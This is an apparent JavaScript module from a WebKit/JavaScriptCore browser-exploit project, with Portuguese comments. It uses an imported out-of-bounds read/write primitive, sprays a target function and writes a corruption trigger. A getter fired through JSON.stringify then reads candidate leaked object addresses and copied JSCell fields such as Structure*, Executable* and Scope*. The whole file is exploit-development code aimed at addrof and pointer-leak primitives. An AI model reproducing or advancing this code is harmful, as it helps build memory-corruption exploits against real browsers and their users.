// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

const FNAME_MAIN_ADDROF_TEST = "addrofCopyValidation_v19b"; // Nova versão

// Constantes do teste addrofCopyValidation
const GETTER_PROPERTY_NAME_ADDROF = "AAAA_GetterForAddrofCopyVal_v19b";
const CORRUPTION_OFFSET_TRIGGER_ADDROF = 0x70;
const CORRUPTION_VALUE_TRIGGER_ADDROF = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Usado para o trigger
const PLANT_OFFSET_0x6C_ADDROF = 0x6C;
const PLANT_DWORD_FOR_0x6C_ADDROF = 0x190A190A; // Marcador para a parte alta do valor lido de 0x68

// Onde esperamos que o JSCell (se copiado) apareça dentro do oob_array_buffer_real
const TARGET_COPY_AREA_BASE_ADDROF = 0x100;

let getter_addrof_test_results = {};
let target_function_for_addrof; // Objeto cujo endereço queremos vazar


// Estrutura esperada do JSCell de uma JSFunction (simplificado)
// StructureID (4 bytes)
// TypeInfo (JSCell) (4 bytes: type, flags, indexingtype, state)
// Butterfly* (8 bytes) (ou Structure* no caso de JSCell base)
// JSFunction specific fields:
//   Executable* (offset 0x18 from JSFunction start)
//   Scope* (offset 0x20 from JSFunction start)

// Suponha que JSC_OFFSETS.KnownStructureIDs.JSFunction tenha o SID correto.
// const JSFUNCTION_SID_KNOWN = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSFunction_STRUCTURE_ID || null;


export async function sprayAndInvestigateObjectExposure() { // Nome da função mantido conforme o chamador em runAllAdvancedTestsS3
    logS3(`--- Iniciando ${FNAME_MAIN_ADDROF_TEST}: Validar Addrof e Analisar Cópia em Offset ---`, "test", FNAME_MAIN_ADDROF_TEST);
    
    getter_addrof_test_results = {
        getter_called: false,
        candidate_addrof_hex: null,
        copied_structure_id_hex: null,
        copied_structure_ptr_hex: null,
        copied_executable_ptr_hex: null,
        copied_scope_ptr_hex: null,
        error: null
    };

    const TARGET_FUNCTION_MARKER_VALUE = "TF_v19b_Marker";
    target_function_for_addrof = function() { return TARGET_FUNCTION_MARKER_VALUE; };

    // Spray leve da função alvo, caso a referência direta não seja a que é pega.
    let sprayedFuncs = [];
    for(let i=0; i < 50; i++) sprayedFuncs.push(target_function_for_addrof);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            getter_addrof_test_results.error = "OOB Init failed";
            logS3("Falha na inicialização OOB.", "error", FNAME_MAIN_ADDROF_TEST);
            return getter_addrof_test_results;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_MAIN_ADDROF_TEST);

        // Limpar área de trabalho em oob_buffer para evitar lixo de testes anteriores
        oob_write_absolute(0x68, AdvancedInt64.Zero, 8); // Limpa 0x68 e 0x6C
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_ADDROF, AdvancedInt64.Zero, 8); // Limpa área do trigger
        oob_write_absolute(TARGET_COPY_AREA_BASE_ADDROF, AdvancedInt64.Zero, 64); // Limpa uma área maior para a cópia

        // Plantar o valor em 0x6C que se tornará a parte ALTA do nosso candidato a addrof lido de 0x68
        const value_to_plant_at_0x6C = new AdvancedInt64(PLANT_DWORD_FOR_0x6C_ADDROF, 0x00000000); // Low = Marcador, High = 0
                                                                                               // Então, se lido de 0x68, o marcador estará na parte ALTA.
        oob_write_absolute(PLANT_OFFSET_0x6C_ADDROF, value_to_plant_at_0x6C, 8);
        logS3(`Plantado ${value_to_plant_at_0x6C.toString(true)} em oob_buffer[${toHex(PLANT_OFFSET_0x6C_ADDROF)}] (esperado ${toHex(PLANT_DWORD_FOR_0x6C_ADDROF)} em [0x6C])`, "info", FNAME_MAIN_ADDROF_TEST);


        const getterObjectForAddrof = {
            get [GETTER_PROPERTY_NAME_ADDROF]() {
                getter_addrof_test_results.getter_called = true;
                logS3(`    >>>> [GETTER ${GETTER_PROPERTY_NAME_ADDROF} ACIONADO!] <<<<`, "vuln", FNAME_MAIN_ADDROF_TEST);
                
                try {
                    // A hipótese é que uma vulnerabilidade (acionada pela escrita em CORRUPTION_OFFSET_TRIGGER_ADDROF)
                    // faz com que um ponteiro para target_function_for_addrof seja escrito parcialmente
                    // ou referenciado de forma que seus bytes apareçam em oob_buffer[0x68].
                    // O valor em oob_buffer[0x6C] (PLANT_DWORD_FOR_0x6C_ADDROF) serve como um marcador
                    // para a parte alta do QWORD lido de 0x68.
                    const value_read_from_0x68 = oob_read_absolute(0x68, 8);
                    logS3(`    [GETTER] Valor lido de oob_buffer[0x68]: ${value_read_from_0x68.toString(true)}`, "info", FNAME_MAIN_ADDROF_TEST);

                    if (value_read_from_0x68.high() === PLANT_DWORD_FOR_0x6C_ADDROF) {
                        getter_addrof_test_results.candidate_addrof_hex = value_read_from_0x68.toString(true);
                        logS3(`      POTENCIAL ADDR_OF CANDIDATO (de 0x68, marcador ${toHex(PLANT_DWORD_FOR_0x6C_ADDROF)} na parte alta OK): ${getter_addrof_test_results.candidate_addrof_hex}`, "vuln", FNAME_MAIN_ADDROF_TEST);
                        
                        // Agora, a hipótese é que o *conteúdo* do objeto no endereço "candidate_addrof_hex"
                        // (ou pelo menos o início dele, o JSCell) foi copiado para TARGET_COPY_AREA_BASE_ADDROF (0x100).
                        logS3(`    [GETTER]: Verificando se o conteúdo do objeto (supostamente em ${getter_addrof_test_results.candidate_addrof_hex}) foi copiado para oob_buffer[${toHex(TARGET_COPY_AREA_BASE_ADDROF)}]...`, "info", FNAME_MAIN_ADDROF_TEST);

                        // Offsets relativos à TARGET_COPY_AREA_BASE_ADDROF
                        const sid_copy_offset      = TARGET_COPY_AREA_BASE_ADDROF + JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET; // 0x100 + 0x0
                        const sptr_copy_offset     = TARGET_COPY_AREA_BASE_ADDROF + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;   // 0x100 + 0x8
                        const executable_copy_offset = TARGET_COPY_AREA_BASE_ADDROF + JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;      // 0x100 + 0x18
                        const scope_copy_offset    = TARGET_COPY_AREA_BASE_ADDROF + JSC_OFFSETS.JSFunction.SCOPE_OFFSET;         // 0x100 + 0x20

                        if (sid_copy_offset + 4 <= oob_array_buffer_real.byteLength) {
                            const sid_val = oob_read_absolute(sid_copy_offset, 4);
                            getter_addrof_test_results.copied_structure_id_hex = toHex(sid_val, 32);
                            logS3(`      StructureID copiado (lido de oob_buffer[${toHex(sid_copy_offset)}]): ${getter_addrof_test_results.copied_structure_id_hex}`, "leak", FNAME_MAIN_ADDROF_TEST);
                            // Verificação opcional se JSFUNCTION_SID_KNOWN for válido
                            // if (JSFUNCTION_SID_KNOWN && sid_val === JSFUNCTION_SID_KNOWN) {
                            //    logS3("        >>>> StructureID CORRESPONDE A JSFunction! (VALIDAÇÃO DE CÓPIA) <<<<", "vuln", FNAME_MAIN_ADDROF_TEST);
                            //    document.title = "ADDR_OF(JSFunction) VALIDADO POR CÓPIA!";
                            // }
                        } else { logS3(`Offset StructureID copiado ${toHex(sid_copy_offset)} fora dos limites.`, "warn", FNAME_MAIN_ADDROF_TEST); }

                        if (sptr_copy_offset + 8 <= oob_array_buffer_real.byteLength) {
                            const sptr_val = oob_read_absolute(sptr_copy_offset, 8);
                            getter_addrof_test_results.copied_structure_ptr_hex = sptr_val.toString(true);
                            logS3(`      Structure* copiado (lido de oob_buffer[${toHex(sptr_copy_offset)}]): ${getter_addrof_test_results.copied_structure_ptr_hex}`, "leak", FNAME_MAIN_ADDROF_TEST);
                            if (sptr_val.high() > 0 && sptr_val.high() < 0xFF000000 && !sptr_val.isZero()) { // Heurística para ponteiro de heap
                                logS3("        >>>> Structure* copiado PARECE UM PONTEIRO DE HEAP VÁLIDO! <<<<", "vuln", FNAME_MAIN_ADDROF_TEST);
                                document.title = "Structure* COPIADO!";
                            }
                        } else { logS3(`Offset Structure* copiado ${toHex(sptr_copy_offset)} fora dos limites.`, "warn", FNAME_MAIN_ADDROF_TEST); }
                        
                        if (executable_copy_offset + 8 <= oob_array_buffer_real.byteLength) {
                            const executable_val = oob_read_absolute(executable_copy_offset, 8);
                            getter_addrof_test_results.copied_executable_ptr_hex = executable_val.toString(true);
                            logS3(`      Executable* copiado (lido de oob_buffer[${toHex(executable_copy_offset)}]): ${getter_addrof_test_results.copied_executable_ptr_hex}`, "leak", FNAME_MAIN_ADDROF_TEST);
                        } else { logS3(`Offset Executable* copiado ${toHex(executable_copy_offset)} fora dos limites.`, "warn", FNAME_MAIN_ADDROF_TEST); }

                        if (scope_copy_offset + 8 <= oob_array_buffer_real.byteLength) {
                            const scope_val = oob_read_absolute(scope_copy_offset, 8);
                            getter_addrof_test_results.copied_scope_ptr_hex = scope_val.toString(true);
                            logS3(`      Scope* copiado (lido de oob_buffer[${toHex(scope_copy_offset)}]): ${getter_addrof_test_results.copied_scope_ptr_hex}`, "leak", FNAME_MAIN_ADDROF_TEST);
                        } else { logS3(`Offset Scope* copiado ${toHex(scope_copy_offset)} fora dos limites.`, "warn", FNAME_MAIN_ADDROF_TEST); }

                    } else {
                        logS3(`      Marcador ${toHex(PLANT_DWORD_FOR_0x6C_ADDROF)} não encontrado na parte alta do valor de 0x68. Encontrado: ${value_read_from_0x68.toString(true)}`, "warn", FNAME_MAIN_ADDROF_TEST);
                    }
                } catch (e_getter) {
                    getter_addrof_test_results.error = `Getter error: ${e_getter.message}`;
                    logS3(`    [GETTER] ERRO: ${e_getter.message}`, "error", FNAME_MAIN_ADDROF_TEST);
                }
                return "GetterAddrofCopyValue"; // Valor de retorno do getter
            }
        };

        // Escrita OOB que (hipoteticamente) aciona a vulnerabilidade que vaza o addrof e copia o objeto.
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_ADDROF, CORRUPTION_VALUE_TRIGGER_ADDROF, 8);
        logS3(`Escrita OOB de trigger (${CORRUPTION_VALUE_TRIGGER_ADDROF.toString(true)}) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER_ADDROF)}]`, "info", FNAME_MAIN_ADDROF_TEST);
        
        await PAUSE_S3(100); // Pausa para a corrupção ter efeito
        
        JSON.stringify(getterObjectForAddrof); // Aciona o getter

        // Log final dos resultados coletados
        logS3("Resultados do Teste Addrof e Cópia:", "info", FNAME_MAIN_ADDROF_TEST);
        for (const key in getter_addrof_test_results) {
            logS3(`  ${key}: ${getter_addrof_test_results[key]}`, "info", FNAME_MAIN_ADDROF_TEST);
        }

        if (getter_addrof_test_results.copied_structure_ptr_hex && getter_addrof_test_results.copied_structure_ptr_hex !== "0x00000000_00000000") {
             logS3("SUCESSO POTENCIAL: Estrutura parece ter sido copiada e um Structure* válido foi lido!", "vuln", FNAME_MAIN_ADDROF_TEST);
        }


    } catch (e) {
        getter_addrof_test_results.error = `General error: ${e.message}`;
        logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_MAIN_ADDROF_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_MAIN_ADDROF_TEST);
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_MAIN_ADDROF_TEST} Concluído ---`, "test", FNAME_MAIN_ADDROF_TEST);
    }
    return getter_addrof_test_results;
}
